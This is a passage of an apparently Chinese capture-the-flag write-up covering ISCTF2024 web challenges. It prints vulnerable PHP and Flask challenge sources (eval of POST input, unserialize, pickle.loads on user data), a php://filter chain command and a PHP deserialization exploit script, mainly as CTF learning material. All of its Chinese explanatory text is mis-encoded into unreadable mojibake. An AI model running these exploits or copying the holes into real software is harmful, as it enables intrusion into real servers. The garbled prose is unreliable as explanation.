invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h2 id="åƒå¹´æ¨±"><a href="#åƒå¹´æ¨±" class="headerlink" title="åƒå¹´æ¨±"></a>åƒå¹´æ¨±</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;dir.php&quot;</span>;<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;proof of work&lt;br&gt;&quot;</span>;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;from&#x27;</span>] === <span class="hljs-string">&quot;ISCTF&quot;</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$dir1</span>;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;what? so where are you from?&#x27;</span>);<br>&#125;<br><br><span class="hljs-comment">// &lt;!-- do you want to learn more?  goto story.txt --&gt;</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>æ·»åŠ ä¸€ä¸ªcookie</p><p><img src="/../images/ISCTF2024-WEB%E5%A4%8D%E7%8E%B0/qyh1.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-keyword">include</span> <span class="hljs-string">&quot;dir.php&quot;</span>;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;name&#x27;</span>]) === <span class="hljs-string">&#x27;ISCTF&#x27;</span>)&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$dir2</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Wrong!&quot;</span>);<br>    &#125;<br><br><br>    <span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>dataä¼ªåè®®å†™å…¥</p><p><img src="/../images/ISCTF2024-WEB%E5%A4%8D%E7%8E%B0/qyh2.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-keyword">include</span> <span class="hljs-string">&quot;dir.php&quot;</span>;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">waf</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/http|php|file|:|=|\/|\?/i&quot;</span>, <span class="hljs-variable">$str</span>) )&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;bad hacker!!!&#x27;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-variable">$poc</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;poc&#x27;</span>];<br>    <span class="hljs-title function_ invoke__">waf</span>(<span class="hljs-variable">$poc</span>);<br>    <span class="hljs-variable">$filename</span> = <span class="hljs-string">&quot;php://filter/<span class="hljs-subst">$poc</span>/resource=/var/www/html/badChar.txt&quot;</span>;<br>    <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$filename</span>);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$result</span> === <span class="hljs-string">&quot;sakura for ISCTF&quot;</span>)&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;yes! master!&quot;</span>;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;output&#x27;</span>] == <span class="hljs-number">114514</span> &amp;&amp; !<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;output&#x27;</span>]))&#123;<br>        <span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$result</span>);<br>    &#125;<br><br><br>    <span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>è¿™é‡Œç”¨php:&#x2F;&#x2F;filteré“¾æ„é€ å­—ç¬¦åŠ strips_tagsæˆªæ–­ï¼Œç„¶årceæ‹¿flag</p><p>ç”¨php_filter_chain_generatoræ„é€ filteré“¾</p><blockquote><p>python php_filter_chain_generator.py â€“chain sakura for ISCTF&lt;?php</p></blockquote><p><img src="/../images/ISCTF2024-WEB%E5%A4%8D%E7%8E%B0/qyh3.png"></p><h2 id="å¤©å‘½äºº"><a href="#å¤©å‘½äºº" class="headerlink" title="å¤©å‘½äºº"></a>å¤©å‘½äºº</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-number">1</span>.jpeg<br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-comment"># å¸®å¤©å‘½äººæœé›†æ³•å®ï¼Œé‡è·é½å¤©ä¹‹å§¿ï¼</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Wuzhishan</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$wu</span>=<span class="hljs-string">&quot;ä¿ºè€å­™å®šè¦è¸ç ´è¿™äº”æŒ‡å±±ï¼&lt;br&gt;&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$zhi</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$shan</span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$j</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;æ­¤åœ°é˜´é˜³äºŒæ°”ç•¥æ˜¾è™šæµ®ï¼ŒåŠ ä¸Šåˆšåˆšå¸¦å…¥çš„é˜³æ°”ï¼Œæˆ–å¯å€Ÿæ­¤éé€ƒï¼&lt;br&gt;&quot;</span>;<br>        <span class="hljs-variable">$yin</span>=<span class="hljs-string">&quot;s214587387a&quot;</span>;<br>        <span class="hljs-variable">$yang</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;J&#x27;</span>];<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$yin</span>)==<span class="hljs-variable">$yang</span>&amp;&amp;<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$yin</span>)==<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$yang</span>))&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;å“¦ï¼Ÿåˆä¸€ä¸ªä¸ä¿¡å¤©å‘½ä¹‹äººï¼Ÿè¡Œäº†ï¼Œæ‹¿äº†ä¸œè¥¿é€Ÿé€Ÿç¦»å¼€å§&lt;br&gt;&quot;</span>;<br>            <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;cat /flag&#x27;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Huoyanjinjing</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$huoyan</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$jinjing</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$huo</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;huoyan=<span class="hljs-string">&quot;ç«çœ¼èƒ½æ´å¯Ÿä¸€åˆ‡é‚ªç¥Ÿï¼&lt;br&gt;&quot;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;huoyan-&gt;jinjing;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;jinjing=<span class="hljs-string">&quot;é‡‘ç›èƒ½çœ‹ç ´ä¸–é—´è¿·æƒ˜ï¼&lt;br&gt;&quot;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;huoyan-&gt;jinjing;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Dinghaishenzhen</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$Jindou</span>=<span class="hljs-string">&quot;ä¸€ä¸ªç­‹æ–—èƒ½ç¿»åä¸‡å…«åƒé‡Œï¼&lt;br&gt;&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$yun</span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$f</span>=<span class="hljs-variable language_">$this</span>-&gt;yun;<br>        <span class="hljs-variable">$f</span>();<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;ä½ çœŸçš„é€ƒå‡ºå»äº†å—ï¼Ÿå¤©å‘½äººï¼Ÿ&lt;br&gt;&quot;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Jingdouyun</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$Qishier</span>=<span class="hljs-number">72</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$bian</span>=<span class="hljs-string">&quot;çœ‹ä¿ºè€å­™ä¸ƒåäºŒå˜ï¼&lt;br&gt;&quot;</span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__sleep</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;ä¸‰æ›´æ•²é—¨ï¼Œè©æè€ç¥–é€æˆ‘ç­‹æ–—äº‘...&lt;br&gt;&quot;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Jindouyun</span>();<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Tianmingren</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$tianming</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$ren</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;è¿·é€”ä¸­çš„ç¾”ç¾Šï¼Œä½ ç›¸ä¿¡å¤©å‘½å—ï¼Ÿ&lt;br&gt;&quot;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;tianming;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;Wukong&#x27;</span>]);<br><span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-string">&#x27;å¼€å±€ä¸€æ ¹æ£ï¼Œè£…å¤‡å…¨é æ‰“ã€‚&#x27;</span>);<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>åºåˆ—åŒ–poc</p><figure class="highlight leaf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs leaf">Tianmingren<span class="hljs-punctuation">#</span><span class="hljs-keyword">__destruct</span><span class="hljs-params">()</span>==&gt;Dinghaishenzhen<span class="hljs-punctuation">#</span><span class="hljs-keyword">__toString</span><span class="hljs-params">()</span>==&gt;Huoyanjinjing<span class="hljs-punctuation">#</span><span class="hljs-keyword">__invoke</span><span class="hljs-params">()</span>==&gt;Wuzhishan<span class="hljs-punctuation">#</span><span class="hljs-keyword">__get</span><span class="hljs-params">()</span><br></code></pre></td></tr></table></figure><p>åºåˆ—åŒ–exp</p><figure class="highlight leaf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs leaf">&lt;?php<br><br>class Tianmingren &#123;<br>    public $tianming;<br>&#125;<br><br>class Dinghaishenzhen &#123;<br>    public $yun;<br>&#125;<br><br>class Huoyanjinjing &#123;<br>    public $huoyan;<br>&#125;<br><br>class Wuzhishan&#123;<br>    <br>&#125;<br><br>$a = new Tianmingren();<br>$a-&gt;tianming = new Dinghaishenzhen();<br>$a-&gt;tianming-&gt;yun = new Huoyanjinjing();<br>$a-&gt;tianming-&gt;yun-&gt;huoyan = new Wuzhishan();<br><br>echo serialize($a);<br><br>// Tianmingren<span class="hljs-punctuation">#</span><span class="hljs-keyword">__destruct</span><span class="hljs-params">()</span>==&gt;Dinghaishenzhen<span class="hljs-punctuation">#</span><span class="hljs-keyword">__toString</span><span class="hljs-params">()</span>==&gt;Huoyanjinjing<span class="hljs-punctuation">#</span><span class="hljs-keyword">__invoke</span><span class="hljs-params">()</span>==&gt;Wuzhishan<span class="hljs-punctuation">#</span><span class="hljs-keyword">__get</span><span class="hljs-params">()</span><br><br>?&gt;<br></code></pre></td></tr></table></figure><p>ç»•è¿‡__get()æ–¹æ³•ä¸­çš„åˆ¤æ–­åªè¦æ‰¾ä¸€ä¸ª0eå¼€å¤´çš„å­—ç¬¦ä¸²ä¸”å…¶md5å€¼ä»ä¸º0eå¼€å¤´å³å¯</p><p>æºç ä¸­çš„â€œthrow new Exception(â€˜å¼€å±€ä¸€æ ¹æ£ï¼Œè£…å¤‡å…¨é æ‰“ã€‚â€™);â€ä¼šæŠ›å‡ºä¸€ä¸ªå¼‚å¸¸ï¼Œç›´æ¥ä¸­æ–­è„šæœ¬æ‰§è¡Œï¼Œå»ç ´åååºåˆ—åŒ–ç»“æ„ï¼Œè¿™é‡Œé€šè¿‡å°†ä¸‹å›¾ä¸­é€‰ä¸­å‡ºçš„0ä¿®æ”¹ä¸º2ï¼Œè¾¾åˆ°ç ´åååºåˆ—åŒ–ç»“æ„çš„ç›®çš„</p><p><img src="/../images/ISCTF2024-WEB%E5%A4%8D%E7%8E%B0/tianming.png"></p><h2 id="æ–°é—»ç³»ç»Ÿ"><a href="#æ–°é—»ç³»ç»Ÿ" class="headerlink" title="æ–°é—»ç³»ç»Ÿ"></a>æ–°é—»ç³»ç»Ÿ</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> base64<br><br>app = Flask(__name__)<br>app.config[<span class="hljs-string">&quot;SECRET_KEY&quot;</span>] = <span class="hljs-string">&quot;W3l1com_isCTF&quot;</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">News</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, title, content</span>) -&gt; <span class="hljs-literal">None</span>:<br>        <span class="hljs-variable language_">self</span>.title = title<br>        <span class="hljs-variable language_">self</span>.content = content<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__repr__</span>(<span class="hljs-params">self</span>) -&gt; <span class="hljs-built_in">str</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">f&quot;news(name=<span class="hljs-subst">&#123;self.title&#125;</span>, words=<span class="hljs-subst">&#123;self.content&#125;</span>)&quot;</span><br>    <br><span class="hljs-keyword">class</span> <span class="hljs-title class_">NewsList</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>) -&gt; <span class="hljs-literal">None</span>:<br>        <span class="hljs-variable language_">self</span>.news_list = []<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">create_news</span>(<span class="hljs-params">self, title, content</span>) -&gt; <span class="hljs-literal">None</span>:<br>        news = News(title,content)<br>        <span class="hljs-variable language_">self</span>.news_list.append(news)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">export_news</span>(<span class="hljs-params">self, news_title</span>) -&gt; <span class="hljs-built_in">str</span> | <span class="hljs-literal">None</span>:<br>        news = <span class="hljs-variable language_">self</span>.get_news(news_title)<br>        <span class="hljs-keyword">if</span> news <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>            <span class="hljs-variable language_">self</span>.news_list.remove(news)<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;åˆ é™¤æˆåŠŸ&#x27;</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">add_news</span>(<span class="hljs-params">self, serialized_news</span>) -&gt; <span class="hljs-literal">None</span>:<br>        <span class="hljs-keyword">try</span>:<br>            news_data = base64.b64decode(serialized_news)<br>            black_list = [<span class="hljs-string">&#x27;create_news&#x27;</span>,<span class="hljs-string">&#x27;export_news&#x27;</span>,<span class="hljs-string">&#x27;add_news&#x27;</span>,<span class="hljs-string">&#x27;get_news&#x27;</span>]<br>            <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> black_list:<br>                <span class="hljs-keyword">if</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">str</span>(news_data):<br>                    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>            news = pickle.loads(news_data)<br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(news,News):<br>                <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-variable language_">self</span>.news_list:<br>                    <span class="hljs-keyword">if</span> i.title == news.title:<br>                        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>                <span class="hljs-variable language_">self</span>.news_list.append(news)<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>        <span class="hljs-keyword">except</span> Exception:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">get_news</span>(<span class="hljs-params">self, news_title</span>) -&gt; News | <span class="hljs-literal">None</span>:<br>        <span class="hljs-keyword">for</span> news <span class="hljs-keyword">in</span> <span class="hljs-variable language_">self</span>.news_list:<br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">str</span>(news.title) == news_title:<br>                <span class="hljs-keyword">return</span> news<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br><br>newslist = NewsList()<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">return</span> redirect(<span class="hljs-string">&quot;/login&quot;</span>)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/login&quot;</span>, methods=[<span class="hljs-string">&quot;GET&quot;</span>, <span class="hljs-string">&quot;POST&quot;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">login</span>():<br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&quot;POST&quot;</span>:<br>        username = request.form.get(<span class="hljs-string">&#x27;username&#x27;</span>)<br>        password = request.form.get(<span class="hljs-string">&#x27;password&#x27;</span>)<br>        <span class="hljs-keyword">if</span> username == <span class="hljs-string">&#x27;test&#x27;</span> <span class="hljs-keyword">and</span> password == <span class="hljs-string">&#x27;test111&#x27;</span>:<br>            session[<span class="hljs-string">&#x27;username&#x27;</span>] = username<br>            session[<span class="hljs-string">&#x27;password&#x27;</span>] = password<br>            session[<span class="hljs-string">&#x27;status&#x27;</span>] = <span class="hljs-string">&#x27;user&#x27;</span><br>            <span class="hljs-keyword">return</span> redirect(<span class="hljs-string">&#x27;/news&#x27;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            session[<span class="hljs-string">&#x27;login_error&#x27;</span>] = <span class="hljs-literal">True</span>               <br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&quot;login.html&quot;</span>)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/news&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">news</span>():<br>    news = newslist.news_list<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&quot;news.html&quot;</span>,news = news)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/admin&#x27;</span>,methods=[<span class="hljs-string">&#x27;GET&#x27;</span>,<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">admin</span>():<br>    <span class="hljs-keyword">if</span> session.get(<span class="hljs-string">&#x27;status&#x27;</span>) != <span class="hljs-string">&#x27;admin&#x27;</span> <span class="hljs-keyword">or</span> session.get(<span class="hljs-string">&#x27;username&#x27;</span>) != <span class="hljs-string">&#x27;admin&#x27;</span> <span class="hljs-keyword">or</span> session.get(<span class="hljs-string">&#x27;password&#x27;</span>) != <span class="hljs-string">&#x27;admin222&#x27;</span>:<br>        <span class="hljs-keyword">return</span> redirect(<span class="hljs-string">&quot;/login&quot;</span>)<br>    news = newslist.news_list<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&quot;admin.html&quot;</span>,news = news)<br>    <br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/create&quot;</span>, methods=[<span class="hljs-string">&quot;POST&quot;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">create_news</span>():<br>    <span class="hljs-keyword">if</span> session.get(<span class="hljs-string">&#x27;status&#x27;</span>) != <span class="hljs-string">&#x27;admin&#x27;</span> <span class="hljs-keyword">or</span> session.get(<span class="hljs-string">&#x27;username&#x27;</span>) != <span class="hljs-string">&#x27;admin&#x27;</span> <span class="hljs-keyword">or</span> session.get(<span class="hljs-string">&#x27;password&#x27;</span>) != <span class="hljs-string">&#x27;admin222&#x27;</span>:<br>        <span class="hljs-keyword">return</span> redirect(<span class="hljs-string">&quot;/login&quot;</span>)   <br>    title = request.form.get(<span class="hljs-string">&#x27;title&#x27;</span>)<br>    content = request.form.get(<span class="hljs-string">&#x27;content&#x27;</span>)<br>    newslist.create_news(title,content)<br>    <span class="hljs-keyword">return</span> redirect(<span class="hljs-string">&quot;/admin&quot;</span>)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/export&quot;</span>, methods=[<span class="hljs-string">&quot;POST&quot;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title 